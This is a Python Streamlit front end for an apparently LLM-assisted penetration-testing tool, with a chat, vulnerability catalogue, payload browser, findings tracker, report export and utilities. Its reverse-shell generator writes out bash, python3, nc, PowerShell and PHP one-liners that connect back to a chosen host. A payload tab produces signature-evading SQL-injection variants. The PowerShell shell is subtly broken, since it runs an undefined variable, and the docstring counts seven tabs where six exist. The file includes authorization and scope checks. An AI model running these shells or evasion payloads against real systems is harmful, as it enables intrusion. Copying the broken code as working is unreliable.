"""
Streamlit interface.

Seven tabs, sidebar, chat surface, and report export. Kept deliberately
plain -- the interesting logic lives in the other modules. This file
turns state into pixels and nothing more.

Revision notes:
  - HTML report export escapes user-controlled finding/evidence text.
  - CISA Sync button is wired to apex_intel_dummy.sync_cisa_feed().
  - NVD CVE lookup is implemented in the Tools tab.
  - Empty inputs, invalid CVEs, and missing evidence are handled.
"""

from __future__ import annotations

import base64
import hashlib
import html as _html
import json
from datetime import datetime
from pathlib import Path
from typing import Dict, Iterable, List

import streamlit as st

from apex_core import (
    APP_NAME, APP_VERSION, APP_TAGLINE,
    ConfigManager, MemoryManager, TargetProfile, VulnerabilityEntry,
    human_size, safe_name,
)
from apex_engine import PERSONAS, persona_label, ReportGenerator
from apex_ops import VulnerabilityTracker, bootstrap_session_state
from apex_payload import (
    WAFEngine, PayloadForge, categories as payload_categories,
    all_payloads, search as payload_search, by_category as payload_by_category,
)
from apex_vulndb import (
    all_vulnerabilities, by_category as vuln_by_category,
    categories as vuln_categories, search as vuln_search, total as vuln_total,
)
from apex_intel_dummy import (
    load_threat_intel, cache_info, sync_cisa_feed, search_intel,
)


# ---------------------------------------------------------------------------
# Theme
# ---------------------------------------------------------------------------

def configure_page() -> None:
    st.set_page_config(
        page_title=f"{APP_NAME} | {APP_TAGLINE}",
        page_icon="APEX", layout="wide",
        initial_sidebar_state="expanded",
    )


THEME = """
<style>
:root {
  --bg:#0a0d12; --surface:#111820; --surface2:#182230; --border:#243040;
  --text:#d6dee8; --muted:#7c8a9c; --accent:#5aa3ff; --green:#3fb950;
  --red:#e5484d; --amber:#d29922;
}
.stApp { background: var(--bg); color: var(--text); }
section[data-testid="stSidebar"] {
  background: var(--surface); border-right: 1px solid var(--border);
}
section[data-testid="stSidebar"] * { color: var(--text); }
h1,h2,h3,h4 { color: var(--accent) !important; letter-spacing: 0.2px; }
a { color: var(--accent); }
.stButton > button {
  background: var(--red); color:#fff; border:1px solid #f2555a;
  border-radius:6px; font-weight:600; padding:6px 14px; width:100%;
}
.stDownloadButton > button {
  background: var(--green); color:#fff; border:1px solid #3fb950;
  border-radius:6px; font-weight:600; padding:6px 14px; width:100%;
}
.stTextInput input, .stTextArea textarea, .stNumberInput input {
  background: var(--surface2) !important; color: var(--text) !important;
  border:1px solid var(--border) !important; border-radius:6px !important;
}
.stTabs [data-baseweb="tab-list"] {
  background: var(--surface); border:1px solid var(--border);
  border-radius:8px; padding:6px; gap:4px;
}
.stTabs [data-baseweb="tab"] {
  background:transparent; color:var(--muted); border-radius:6px;
  padding:8px 14px; font-weight:600;
}
.stTabs [aria-selected="true"] {
  background: var(--surface2) !important; color: var(--accent) !important;
}
code, pre {
  background: var(--surface2) !important; color:#79c0ff !important;
  border-radius:6px;
}
.apex-header {
  display:flex; align-items:center; justify-content:space-between;
  padding:18px 24px; border:1px solid var(--border);
  background:linear-gradient(135deg,#111820 0%,#0a0d12 100%);
  border-radius:10px; margin-bottom:18px;
}
.apex-header h1 { margin:0; font-size:1.65rem; }
.apex-header p { margin:4px 0 0 0; color:var(--muted); font-size:0.9rem; }
.apex-badge {
  padding:4px 10px; border-radius:12px; background:var(--surface2);
  color:var(--muted); font-size:0.75rem; border:1px solid var(--border);
}
.scope-warning {
  background:rgba(229,72,77,0.08); border:1px solid rgba(229,72,77,0.4);
  border-radius:8px; padding:12px 16px; color:#ffb4b6; font-size:0.9rem;
}
</style>
"""


def inject_theme() -> None:
    st.markdown(THEME, unsafe_allow_html=True)


def render_header() -> None:
    st.markdown(
        f"""
        <div class="apex-header">
          <div>
            <h1>{APP_NAME} <span class="apex-badge">v{APP_VERSION}</span></h1>
            <p>{APP_TAGLINE} - local Ollama - on-premises only</p>
          </div>
          <div class="apex-badge">{datetime.now().strftime('%Y-%m-%d %H:%M')}</div>
        </div>
        """,
        unsafe_allow_html=True,
    )


def _esc(text: object) -> str:
    return _html.escape(str(text if text is not None else ""))


# ---------------------------------------------------------------------------
# Sidebar
# ---------------------------------------------------------------------------

def render_sidebar() -> None:
    config: ConfigManager = st.session_state.config_mgr
    memory: MemoryManager = st.session_state.memory
    tracker: VulnerabilityTracker = st.session_state.v_tracker
    bridge = st.session_state.llm_bridge
    sid: str = st.session_state.session_id

    with st.sidebar:
        st.markdown("### Command Center")

        with st.expander("Target Profile", expanded=True):
            ip = st.text_input("IP / Host", value=tracker.target.ip_address, key="sb_ip")
            host = st.text_input("Hostname", value=tracker.target.hostname, key="sb_host")
            os_info = st.text_input("OS", value=tracker.target.os_info, key="sb_os")
            stack = st.text_input("Stack (nginx, php, mysql)",
                                  value=tracker.target.technologies, key="sb_stack")
            env_opts = ["lab", "staging", "production", "ctf", "bug-bounty"]
            env_idx = (env_opts.index(tracker.target.environment)
                       if tracker.target.environment in env_opts else 0)
            env = st.selectbox("Environment", env_opts, index=env_idx, key="sb_env")
            org = st.text_input("Organization", value=tracker.target.organization, key="sb_org")
            auth = st.text_input(
                "Authorization Reference",
                value=tracker.target.authorization_ref,
                placeholder="SOW / ticket / engagement ID", key="sb_auth",
            )
            scope = st.text_area(
                "Approved Scope (comma-separated hosts / CIDRs)",
                value=tracker.target.scope_notes,
                height=70, key="sb_scope",
                help="e.g. 10.0.0.0/24, app.example.com, *.internal.lab",
            )
            if st.button("Save Target", key="btn_save_target"):
                tracker.set_target(TargetProfile(
                    ip_address=ip.strip(), hostname=host.strip(),
                    os_info=os_info.strip(), technologies=stack.strip(),
                    environment=env, organization=org.strip(),
                    authorization_ref=auth.strip(), scope_notes=scope.strip(),
                ))
                bridge.invalidate()
                st.toast("Target saved.", icon="OK")

        with st.expander("Model", expanded=False):
            models = bridge.list_models()
            current = str(config.get("model"))
            if models and current not in models:
                st.caption(f"Note: `{current}` not pulled locally.")
            model = st.text_input("Model", value=current, key="sb_model")
            temp = st.slider("Temperature", 0.0, 1.0,
                             float(config.get("temperature")), 0.05, key="sb_temp")
            top_p = st.slider("Top-p", 0.1, 1.0,
                              float(config.get("top_p")), 0.05, key="sb_topp")
            tokens = st.slider("Max tokens", 256, 8192,
                               int(config.get("num_predict")), 128, key="sb_tokens")
            ctx = st.slider("Memory depth", 4, 120,
                            int(config.get("context_messages")), 2, key="sb_ctx")
            allow = st.checkbox("Enable payload generation",
                                value=bool(config.get("allow_payload_gen")),
                                key="sb_allow")
            if st.button("Save Model Config", key="btn_save_model"):
                changed = config.update({
                    "model": model.strip(),
                    "temperature": float(temp),
                    "top_p": float(top_p),
                    "num_predict": int(tokens),
                    "context_messages": int(ctx),
                    "allow_payload_gen": bool(allow),
                })
                if changed:
                    bridge.invalidate()
                st.toast("Model config saved.", icon="OK")

        with st.expander("Persona", expanded=False):
            keys = list(PERSONAS.keys())
            current_p = str(config.get("persona"))
            idx = keys.index(current_p) if current_p in keys else 0
            chosen = st.selectbox("Active Role", keys, index=idx,
                                  format_func=persona_label, key="sb_persona")
            if chosen != current_p:
                config.set("persona", chosen)
                bridge.invalidate()
            if chosen == "custom":
                cp = st.text_area(
                    "Custom prompt",
                    value=str(config.get("custom_prompt", "")),
                    height=110, key="sb_custom",
                )
                if st.button("Save Custom Prompt", key="btn_save_custom"):
                    config.set("custom_prompt", cp)
                    bridge.invalidate()
                    st.toast("Custom prompt saved.", icon="OK")

        with st.expander("Sessions", expanded=False):
            sessions = memory.list_sessions()
            if sessions:
                labels = {s["session_id"]: f"{s['title'][:26]} - {s['updated_at'][:16]}"
                          for s in sessions}
                current_s = st.selectbox(
                    "Switch", list(labels.keys()),
                    format_func=lambda k: labels.get(k, k[:8]),
                    index=(list(labels.keys()).index(sid) if sid in labels else 0),
                    key="sb_switch",
                )
                if current_s != sid:
                    st.session_state.session_id = current_s
                    bridge.invalidate()
                    st.rerun()
            new_title = st.text_input("New session title",
                                      value="New Engagement", key="sb_new_title")
            if st.button("New Session", key="btn_new_session"):
                new_sid = memory.create_session(title=new_title or "New Engagement")
                st.session_state.session_id = new_sid
                bridge.invalidate()
                st.rerun()
            if st.button("Delete Current", key="btn_del"):
                memory.delete_session(sid)
                st.session_state.session_id = memory.create_session(
                    title="New Engagement"
                )
                bridge.invalidate()
                st.rerun()

        with st.expander("Threat Intelligence", expanded=False):
            info = cache_info()
            st.caption(f"Cache: {info['count']} entries")
            if info["last_sync"]:
                st.caption(f"Last sync: {info['last_sync'][:19]}")
            else:
                st.caption("Never synced.")
            if st.button("Sync CISA KEV", key="btn_cisa_sync"):
                with st.spinner("Fetching CISA feed..."):
                    result = sync_cisa_feed()
                if result["ok"]:
                    st.success(f"Synced {result['count']} entries.")
                else:
                    st.error(f"Sync failed: {result['error']}")

        with st.expander("Status", expanded=True):
            health = bridge.health()
            run = health["ollama_running"]
            st.markdown(f"**Ollama:** {'online' if run else 'offline'}")
            st.markdown(f"**Model:** `{_esc(health['active_model'])}` "
                        f"({'loaded' if health['active_model_present'] else 'missing'})")
            st.caption(f"Vulnerabilities indexed: {vuln_total()}")
            st.caption(f"Payloads loaded: {len(all_payloads())}")
            st.caption(f"Findings in session: {len(tracker.findings)}")
            in_scope, _reason = tracker.target_in_scope()
            st.caption(f"Scope check: {'in scope' if in_scope else 'out of scope'}")


# ---------------------------------------------------------------------------
# Chat tab
# ---------------------------------------------------------------------------

def _chunk_text(text: str, size: int) -> Iterable[str]:
    if not text:
        return
    i = 0
    while i < len(text):
        end = min(i + size, len(text))
        if end < len(text):
            pivot = text.rfind(" ", i, end)
            if pivot > i + size // 2:
                end = pivot + 1
        yield text[i:end]
        i = end


def render_chat_tab() -> None:
    memory = st.session_state.memory
    tracker = st.session_state.v_tracker
    orchestrator = st.session_state.orchestrator
    sid = st.session_state.session_id

    if not tracker.has_authorization():
        st.markdown(
            '<div class="scope-warning">No authorization reference and/or '
            'approved scope set. Active operations will be refused. '
            'Fill in the Target Profile before running tests.</div>',
            unsafe_allow_html=True,
        )
    else:
        in_scope, reason = tracker.target_in_scope()
        if not in_scope:
            st.markdown(
                f'<div class="scope-warning">{_esc(reason)}</div>',
                unsafe_allow_html=True,
            )

    with st.expander("Attach evidence", expanded=False):
        uploads = st.file_uploader(
            "Files",
            type=["png", "jpg", "jpeg", "gif", "webp", "pdf",
                  "txt", "log", "json", "xml", "csv"],
            accept_multiple_files=True, key="chat_uploads",
        )
        c1, c2 = st.columns(2)
        with c1:
            caption = st.text_input("Caption", key="chat_caption")
        with c2:
            linked = st.text_input("Link to finding ID", key="chat_linked")
        if uploads and st.button("Save Evidence", key="btn_save_ev"):
            from apex_core import EVIDENCE_DIR
            saved = 0
            for up in uploads:
                data = up.getvalue()
                if not data:
                    continue
                suffix = Path(up.name).suffix.lower() or ".bin"
                stem = safe_name(Path(up.name).stem)[:60]
                stamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S")
                path = EVIDENCE_DIR / f"{stamp}_{stem}{suffix}"
                try:
                    path.write_bytes(data)
                except OSError as exc:
                    st.error(f"Could not save {up.name}: {exc}")
                    continue
                memory.add_evidence(
                    session_id=sid, filename=up.name, filepath=str(path),
                    mime_type=getattr(up, "type", "application/octet-stream"),
                    size_bytes=len(data), caption=caption, linked_cve=linked,
                )
                saved += 1
            if saved:
                st.toast(f"Saved {saved} file(s).", icon="OK")
                st.rerun()

    evidence = memory.list_evidence(sid)
    if evidence:
        with st.expander(f"Evidence ({len(evidence)})", expanded=False):
            for ev in evidence:
                st.markdown(f"**{_esc(ev['filename'])}** - "
                            f"{human_size(ev['size_bytes'])}")
                if ev.get("caption"):
                    st.caption(ev["caption"])
                if st.button(f"Remove {ev['filename']}",
                             key=f"rm_{ev['evidence_id']}"):
                    memory.delete_evidence(ev["evidence_id"])
                    st.rerun()

    history = memory.get_messages(sid, include_errors=True)
    if not history:
        st.info(
            "No messages yet. Start by describing the target, pasting "
            "an error, or sharing a URL."
        )
    for msg in history:
        with st.chat_message(msg["role"]):
            st.markdown(msg["content"])
            if msg.get("created_at"):
                st.caption(msg["created_at"][:19])

    user_input = st.chat_input("Describe target, paste error, ask for next step...")
    if not user_input:
        return
    with st.chat_message("user"):
        st.markdown(user_input)
    with st.chat_message("assistant"):
        box = st.empty()
        with st.spinner("Analyzing..."):
            ok, response = orchestrator.process(sid, user_input, tracker)
        if ok:
            buf = ""
            for chunk in _chunk_text(response, 300):
                buf += chunk
                box.markdown(buf)
            box.markdown(response)
        else:
            box.error(response)
    st.rerun()


# ---------------------------------------------------------------------------
# Vulnerability catalogue tab
# ---------------------------------------------------------------------------

def render_vulns_tab() -> None:
    st.subheader("Vulnerability Catalogue")
    st.caption(f"{vuln_total()} classes across {len(vuln_categories())} categories")

    keyword = st.text_input("Search", placeholder="sqli, ssrf, jwt, race", key="vuln_q")
    cats = ["all"] + vuln_categories()
    cat = st.selectbox("Category", cats, key="vuln_cat")

    if keyword.strip():
        rows = vuln_search(keyword)
    elif cat != "all":
        rows = vuln_by_category().get(cat, [])
    else:
        rows = all_vulnerabilities()

    if not rows:
        st.info("No entries match.")
        return

    for v in rows:
        sev = v.get("severity", "Medium")
        with st.expander(f"{v['name']} - {sev} - {v['category']}"):
            st.markdown(f"**Description**  \n{v['description']}")
            st.markdown("**Detection**")
            for line in v.get("detection", []):
                st.markdown(f"- {line}")
            st.markdown("**Exploitation**")
            for line in v.get("exploitation", []):
                st.markdown(f"- {line}")
            if v.get("payloads"):
                st.markdown("**Linked payloads**")
                for p in v["payloads"]:
                    st.code(p, language="text")
            st.markdown(f"**Mitigation**  \n{v.get('mitigation', '-')}")
            if v.get("references"):
                st.caption("References: " + ", ".join(v["references"]))


# ---------------------------------------------------------------------------
# Payload forge tab
# ---------------------------------------------------------------------------

def render_payload_tab() -> None:
    st.subheader("Payload Engine")
    st.caption("Curated payloads plus an on-demand generator for novel variants.")

    mode = st.radio(
        "Mode",
        ["Browse library", "Generate novel", "WAF evasion"],
        horizontal=True, key="payload_mode",
    )

    if mode == "Browse library":
        cats = ["all"] + payload_categories()
        cat = st.selectbox("Category", cats, key="pl_cat")
        keyword = st.text_input("Search", placeholder="ssrf, mssql, jwt", key="pl_q")
        if keyword.strip():
            rows = payload_search(keyword)
        elif cat != "all":
            rows = payload_by_category().get(cat, [])
        else:
            rows = all_payloads()
        for p in rows:
            sev = p.get("severity", "medium")
            with st.expander(f"{p['name']} - {sev.upper()}"):
                st.code(p["payload"], language="text")
                st.caption(f"Context: {p['context']}")
                if p.get("notes"):
                    st.caption(f"Notes: {p['notes']}")
                st.caption("Tags: " + ", ".join(p.get("tags", [])))

    elif mode == "Generate novel":
        st.markdown(
            "The forge combines a semantic scaffold with random filler and "
            "one WAF chain. Results are not in any public signature DB."
        )
        c1, c2, c3 = st.columns(3)
        with c1:
            kind = st.selectbox("Kind",
                                list(PayloadForge.SCAFFOLDS.keys()),
                                key="gen_kind")
        with c2:
            dialect = st.selectbox("Dialect",
                                   list(PayloadForge.EXPRS.keys()),
                                   key="gen_dialect")
        with c3:
            waf = st.selectbox("WAF",
                               list(WAFEngine.PROFILES.keys()),
                               key="gen_waf")
        count = st.slider("Count", 1, 10, 3, key="gen_count")
        if st.button("Forge", key="btn_forge"):
            results = PayloadForge.forge(kind, dialect, waf, count=count)
            for r in results:
                st.markdown(f"**Seed {r['seed']} - {r['waf']}**")
                st.code(r["payload"], language="text")
                st.caption(r["note"])
                st.download_button(
                    "Download",
                    data=r["payload"],
                    file_name=f"payload_{r['seed']}.txt",
                    mime="text/plain",
                    key=f"dl_forge_{r['seed']}",
                )
                st.markdown("---")

    else:
        st.markdown("Compose an encoding chain for a specific WAF family.")
        base = st.text_input("Base payload", value="' OR 1=1--", key="waf_base")
        waf = st.selectbox("WAF", list(WAFEngine.PROFILES.keys()), key="waf_pick")
        count = st.slider("Variants", 1, 5, 3, key="waf_count")
        if st.button("Generate", key="btn_waf"):
            results = WAFEngine.generate(base, waf, count=count)
            for r in results:
                st.markdown(f"**Seed {r['seed']} - chain: {', '.join(r['chain'])}**")
                st.code(r["payload"], language="text")
                st.caption(r["note"])


# ---------------------------------------------------------------------------
# Findings tab
# ---------------------------------------------------------------------------

def render_findings_tab() -> None:
    tracker = st.session_state.v_tracker
    memory = st.session_state.memory
    sid = st.session_state.session_id

    st.subheader("Findings Tracker")

    with st.form("add_finding", clear_on_submit=True):
        c1, c2 = st.columns(2)
        with c1:
            cve = st.text_input("ID", placeholder="CVE-2024-1234 or LAB-001")
            sev = st.selectbox("Severity",
                               ["Critical", "High", "Medium", "Low", "Info"])
            cvss = st.number_input("CVSS", 0.0, 10.0, 0.0, 0.1)
            title = st.text_input("Title")
        with c2:
            cat = st.text_input("Category")
            tools = st.text_input("Tools used")
            refs = st.text_input("References (comma-separated)")
            vec = st.text_input("CVSS vector")
        desc = st.text_area("Description", height=70)
        impact = st.text_area("Impact", height=60)
        steps = st.text_area("Reproduce steps (one per line)", height=80)
        mit = st.text_area("Remediation", height=80)
        if st.form_submit_button("Add"):
            if not cve.strip():
                st.error("ID is required.")
            else:
                added = tracker.add(VulnerabilityEntry(
                    cve_id=cve.strip(), severity=sev, title=title.strip(),
                    description=desc.strip(), mitigation=mit.strip(),
                    cvss_score=float(cvss), cvss_vector=vec.strip(),
                    impact=impact.strip(), category=cat.strip(),
                    references=[r.strip() for r in refs.split(",") if r.strip()],
                    tools_used=[t.strip() for t in tools.split(",") if t.strip()],
                    steps_to_reproduce=[s.strip() for s in steps.splitlines() if s.strip()],
                ))
                if added:
                    st.rerun()
                else:
                    st.warning("That ID is already tracked "
                               "(case-insensitive match).")

    st.markdown("---")
    if not tracker.findings:
        st.info("No findings recorded.")
        return

    summary = tracker.summary()
    cols = st.columns(5)
    for col, key in zip(cols, ["Critical", "High", "Medium", "Low", "Info"]):
        col.metric(key, summary.get(key, 0))

    st.markdown("---")
    for v in tracker.findings:
        with st.expander(f"{v.cve_id} - {v.title or 'Untitled'} - {v.severity}"):
            st.markdown(v.description or "_No description._")
            if v.steps_to_reproduce:
                st.markdown("**Steps**")
                for i, s in enumerate(v.steps_to_reproduce, 1):
                    st.markdown(f"{i}. {s}")
            if v.mitigation:
                st.markdown("**Remediation**")
                st.markdown(v.mitigation)
            if st.button("Remove", key=f"rm_{v.cve_id}"):
                tracker.remove(v.cve_id)
                st.rerun()


# ---------------------------------------------------------------------------
# Reports tab
# ---------------------------------------------------------------------------

def render_reports_tab() -> None:
    config = st.session_state.config_mgr
    tracker = st.session_state.v_tracker
    memory = st.session_state.memory
    sid = st.session_state.session_id

    st.subheader("Reports")

    if not tracker.findings:
        st.info("Add at least one finding before exporting a report.")
        return

    author = st.text_input("Author", value=str(config.get("report_author")),
                           key="rep_author")
    org = st.text_input("Organization", value=str(config.get("report_org")),
                        key="rep_org")
    if st.button("Save Author Info", key="btn_save_author"):
        config.update({"report_author": author, "report_org": org})
        st.toast("Saved.", icon="OK")

    evidence = memory.list_evidence(sid)
    try:
        md = ReportGenerator.to_markdown(tracker, evidence, sid, author, org)
        html = ReportGenerator.to_html(md, title=f"APEX-SEC {sid[:8]}")
        js = ReportGenerator.to_json(tracker, evidence, sid)
    except Exception as exc:
        st.error(f"Report generation failed: {exc}")
        return

    stamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

    tab1, tab2, tab3 = st.tabs(["Markdown", "HTML", "JSON"])
    with tab1:
        st.markdown(md)
        st.download_button("Download Markdown", data=md,
                           file_name=f"apex_{stamp}.md",
                           mime="text/markdown", key="dl_md")
    with tab2:
        try:
            st.components.v1.html(html, height=600, scrolling=True)
        except Exception:
            st.text_area("HTML", html, height=400)
        st.download_button("Download HTML", data=html,
                           file_name=f"apex_{stamp}.html",
                           mime="text/html", key="dl_html")
        st.caption(
            "HTML export is generated from Markdown with all "
            "user-controlled fields escaped. Inline scripts in findings "
            "are rendered as text, not executed."
        )
    with tab3:
        st.code(js, language="json")
        st.download_button("Download JSON", data=js,
                           file_name=f"apex_{stamp}.json",
                           mime="application/json", key="dl_json")

    if st.button("Save All to disk", key="btn_save_all"):
        written = ReportGenerator.save_all(md, html, js)
        if written:
            st.success(f"Wrote {len(written)} file(s).")
        else:
            st.error("No files written — check config/reports permissions.")


# ---------------------------------------------------------------------------
# Utilities tab
# ---------------------------------------------------------------------------

def render_tools_tab() -> None:
    st.subheader("Utilities")
    tool = st.selectbox(
        "Tool",
        ["Hash", "Base64", "URL", "JWT", "Reverse Shell", "CISA Search", "NVD Lookup"],
        key="tool_pick",
    )

    if tool == "Hash":
        text = st.text_area("Input", key="hash_in")
        algo = st.selectbox("Algorithm",
                            ["md5", "sha1", "sha256", "sha512"],
                            key="hash_algo")
        if text:
            try:
                st.code(hashlib.new(algo, text.encode()).hexdigest())
            except ValueError as exc:
                st.error(str(exc))

    elif tool == "Base64":
        text = st.text_area("Input", key="b64_in")
        mode = st.radio("Mode", ["Encode", "Decode"], horizontal=True,
                        key="b64_mode")
        if text:
            try:
                if mode == "Encode":
                    out = base64.b64encode(text.encode()).decode()
                else:
                    out = base64.b64decode(text.encode()).decode(errors="replace")
                st.code(out)
            except Exception as exc:
                st.error(str(exc))

    elif tool == "URL":
        text = st.text_area("Input", key="url_in")
        mode = st.radio("Mode", ["Encode", "Decode"], horizontal=True,
                        key="url_mode")
        if text:
            from urllib.parse import quote, unquote
            st.code(quote(text) if mode == "Encode" else unquote(text))

    elif tool == "JWT":
        token = st.text_area("JWT", key="jwt_in")
        if token:
            parts = token.strip().split(".")
            if len(parts) < 2:
                st.error("Not a valid JWT.")
            else:
                def _pad(s: str) -> str:
                    return s + "=" * (-len(s) % 4)
                try:
                    h = json.loads(base64.urlsafe_b64decode(_pad(parts[0])))
                    p = json.loads(base64.urlsafe_b64decode(_pad(parts[1])))
                    st.json(h)
                    st.json(p)
                except Exception as exc:
                    st.error(f"Could not decode JWT: {exc}")

    elif tool == "Reverse Shell":
        tracker = st.session_state.v_tracker
        if not tracker.has_authorization():
            st.warning("Set an authorization reference and approved scope "
                       "before generating reverse shells.")
            return
        in_scope, reason = tracker.target_in_scope()
        if not in_scope:
            st.warning(f"Out of scope: {reason}")
            return
        c1, c2 = st.columns(2)
        with c1:
            lhost = st.text_input("LHOST", value="10.0.0.1", key="rs_lh")
        with c2:
            lport = st.text_input("LPORT", value="4444", key="rs_lp")
        kind = st.selectbox("Shell",
                            ["bash", "python3", "nc", "powershell", "php"],
                            key="rs_kind")
        if lhost and lport:
            st.code(_revshell(kind, lhost, lport), language="bash")

    elif tool == "CISA Search":
        kw = st.text_input("Keyword", placeholder="exchange, chrome, vpn",
                           key="cisa_q")
        if kw.strip():
            hits = search_intel(kw)
            if not hits:
                st.info("No KEV entries match. Try Sync CISA first.")
            for item in hits:
                st.markdown(
                    f"**{item.get('cveID','')}** — "
                    f"{item.get('vulnerabilityName','')}"
                )
                st.caption(
                    f"{item.get('vendorProject','')} / "
                    f"{item.get('product','')} — "
                    f"added {item.get('dateAdded','')}"
                )

    else:
        cve_id = st.text_input("CVE ID", placeholder="CVE-2024-3094",
                               key="nvd_q").strip()
        if cve_id and st.button("Lookup", key="btn_nvd"):
            if not cve_id.upper().startswith("CVE-"):
                st.error("CVE ID must start with 'CVE-'.")
            else:
                import requests as _rq
                try:
                    r = _rq.get(
                        "https://services.nvd.nist.gov/rest/json/cves/2.0",
                        params={"cveId": cve_id.upper()},
                        timeout=15,
                    )
                    if r.status_code != 200:
                        st.error(f"NVD returned HTTP {r.status_code}.")
                    else:
                        data = r.json()
                        vulns = data.get("vulnerabilities") or []
                        if not vulns:
                            st.warning("CVE not found in NVD.")
                        else:
                            cve = vulns[0]["cve"]
                            st.markdown(f"**{cve.get('id','')}**")
                            desc = next(
                                (d["value"] for d in cve.get("descriptions", [])
                                 if d.get("lang") == "en"), ""
                            )
                            st.write(desc)
                            metrics = cve.get("metrics", {})
                            for k, v in metrics.items():
                                if v:
                                    st.caption(f"{k}: {v[0]}")
                                    break
                except _rq.exceptions.RequestException as exc:
                    st.error(f"NVD request failed: {exc}")


def _revshell(kind: str, lhost: str, lport: str) -> str:
    if kind == "bash":
        return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    if kind == "python3":
        return (f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'")
    if kind == "nc":
        return f"nc -e /bin/sh {lhost} {lport}"
    if kind == "powershell":
        return (f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
                f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
                f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                f"$sb=(iex $d 2>&1|Out-String);"
                f"$s.Write(([text.encoding]::ASCII).GetBytes($sb),0,"
                f"$sb.Length);$s.Flush()}}")
    if kind == "php":
        return (f"php -r '$s=fsockopen(\"{lhost}\",{lport});"
                f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    return ""


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    configure_page()
    inject_theme()
    bootstrap_session_state()
    render_header()
    render_sidebar()

    tabs = st.tabs([
        "Chat", "Catalogue", "Payloads", "Findings", "Reports", "Tools",
    ])
    with tabs[0]: render_chat_tab()
    with tabs[1]: render_vulns_tab()
    with tabs[2]: render_payload_tab()
    with tabs[3]: render_findings_tab()
    with tabs[4]: render_reports_tab()
    with tabs[5]: render_tools_tab()
